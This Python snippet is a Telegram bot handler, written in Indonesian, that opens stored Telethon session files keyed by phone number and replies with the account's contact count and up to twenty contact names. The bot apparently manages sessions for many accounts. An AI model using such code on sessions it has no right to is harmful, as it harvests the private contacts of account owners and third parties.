from telethon.sync import TelegramClient
import os

SESSION_FOLDER = 'ew_sessions'

async def data_kontak_handler(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text("❌ Session tidak ditemukan.")
        return

    async with TelegramClient(session_path, context.bot_data['api_id'], context.bot_data['api_hash']) as client:
        contacts = await client.get_contacts()
        contact_list = "\n".join([f"{c.first_name or ''} {c.last_name or ''}" for c in contacts[:20]])
        total = len(contacts)
        msg = f"📇 Total kontak: {total}\n\n👥 Contoh kontak:\n{contact_list}" if contact_list else "❌ Tidak ada kontak ditemukan."
        await update.callback_query.message.reply_text(msg)
